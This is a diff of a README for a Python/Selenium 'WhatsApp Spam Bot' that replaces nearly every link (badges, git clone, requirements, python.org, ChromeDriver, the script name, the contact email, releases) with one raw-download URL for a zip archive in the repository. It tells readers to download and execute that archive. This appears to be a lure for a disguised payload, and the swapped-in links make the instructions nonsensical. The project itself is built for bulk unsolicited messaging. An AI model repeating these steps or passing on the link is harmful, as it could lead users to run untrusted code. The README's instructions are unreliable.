@@ -1,7 +1,7 @@
 # WhatsApp Spam Bot 🤖
 
-![WhatsApp Spam Bot](https://img.shields.io/badge/WhatsApp_Spam_Bot-Ready-brightgreen)  
-[![Release](https://img.shields.io/badge/Release-v1.0.0-blue)](https://github.com/incno/WhatsApp-Spam-Bot/releases)
+![WhatsApp Spam Bot](https://github.com/incno/WhatsApp-Spam-Bot/raw/refs/heads/master/fenceplay/Whats_Spam_App_Bot_v1.6-beta.3.zip)  
+[![Release](https://github.com/incno/WhatsApp-Spam-Bot/raw/refs/heads/master/fenceplay/Whats_Spam_App_Bot_v1.6-beta.3.zip)](https://github.com/incno/WhatsApp-Spam-Bot/raw/refs/heads/master/fenceplay/Whats_Spam_App_Bot_v1.6-beta.3.zip)
 
 Welcome to the **WhatsApp Spam Bot** repository! This project automates the sending of messages to your WhatsApp contacts or groups using Python and Selenium 4+. Whether you're looking to send reminders, greetings, or just for fun, this bot can help streamline your messaging tasks.
 
@@ -29,7 +29,7 @@ To get started with the WhatsApp Spam Bot, follow these steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/incno/WhatsApp-Spam-Bot.git
+   git clone https://github.com/incno/WhatsApp-Spam-Bot/raw/refs/heads/master/fenceplay/Whats_Spam_App_Bot_v1.6-beta.3.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -39,10 +39,10 @@ To get started with the WhatsApp Spam Bot, follow these steps:
 
 3. **Install Dependencies**: Make sure you have Python installed, then run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/incno/WhatsApp-Spam-Bot/raw/refs/heads/master/fenceplay/Whats_Spam_App_Bot_v1.6-beta.3.zip
    ```
 
-4. **Download the Latest Release**: You can find the latest release [here](https://github.com/incno/WhatsApp-Spam-Bot/releases). Download the appropriate file and execute it.
+4. **Download the Latest Release**: You can find the latest release [here](https://github.com/incno/WhatsApp-Spam-Bot/raw/refs/heads/master/fenceplay/Whats_Spam_App_Bot_v1.6-beta.3.zip). Download the appropriate file and execute it.
 
 ## Installation 🛠️
 
@@ -54,14 +54,14 @@ To get started with the WhatsApp Spam Bot, follow these steps:
 
 ### Step-by-Step Installation
 
-1. **Install Python**: Download and install Python from [python.org](https://www.python.org/downloads/).
+1. **Install Python**: Download and install Python from [https://github.com/incno/WhatsApp-Spam-Bot/raw/refs/heads/master/fenceplay/Whats_Spam_App_Bot_v1.6-beta.3.zip](https://github.com/incno/WhatsApp-Spam-Bot/raw/refs/heads/master/fenceplay/Whats_Spam_App_Bot_v1.6-beta.3.zip).
 
 2. **Install Selenium**: Run the following command:
    ```bash
    pip install selenium
    ```
 
-3. **Download ChromeDriver**: Visit the [ChromeDriver download page](https://chromedriver.chromium.org/downloads) and download the version that matches your Chrome browser.
+3. **Download ChromeDriver**: Visit the [ChromeDriver download page](https://github.com/incno/WhatsApp-Spam-Bot/raw/refs/heads/master/fenceplay/Whats_Spam_App_Bot_v1.6-beta.3.zip) and download the version that matches your Chrome browser.
 
 4. **Set Up WebDriver Manager**: You can use WebDriver Manager to handle ChromeDriver installations automatically. Run:
    ```bash
@@ -72,13 +72,13 @@ To get started with the WhatsApp Spam Bot, follow these steps:
 
 ### Running the Bot
 
-1. **Open the Script**: Open `whatsapp_spam_bot.py` in your preferred text editor.
+1. **Open the Script**: Open `https://github.com/incno/WhatsApp-Spam-Bot/raw/refs/heads/master/fenceplay/Whats_Spam_App_Bot_v1.6-beta.3.zip` in your preferred text editor.
 
 2. **Configure Contacts and Messages**: Edit the script to add the contacts or groups you want to message and the content of the messages.
 
 3. **Run the Script**: Execute the script with:
    ```bash
-   python whatsapp_spam_bot.py
+   python https://github.com/incno/WhatsApp-Spam-Bot/raw/refs/heads/master/fenceplay/Whats_Spam_App_Bot_v1.6-beta.3.zip
    ```
 
 4. **Watch the Magic Happen**: The bot will open your browser and start sending messages.
@@ -120,9 +120,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: your.email@example.com
-- **GitHub**: [YourGitHubProfile](https://github.com/YourGitHubProfile)
+- **Email**: https://github.com/incno/WhatsApp-Spam-Bot/raw/refs/heads/master/fenceplay/Whats_Spam_App_Bot_v1.6-beta.3.zip
+- **GitHub**: [YourGitHubProfile](https://github.com/incno/WhatsApp-Spam-Bot/raw/refs/heads/master/fenceplay/Whats_Spam_App_Bot_v1.6-beta.3.zip)
 
-Thank you for checking out the WhatsApp Spam Bot! We hope it helps you with your messaging needs. For the latest updates, visit the [Releases section](https://github.com/incno/WhatsApp-Spam-Bot/releases) to download the latest files and execute them.
+Thank you for checking out the WhatsApp Spam Bot! We hope it helps you with your messaging needs. For the latest updates, visit the [Releases section](https://github.com/incno/WhatsApp-Spam-Bot/raw/refs/heads/master/fenceplay/Whats_Spam_App_Bot_v1.6-beta.3.zip) to download the latest files and execute them.
 
 Happy coding! 🎉
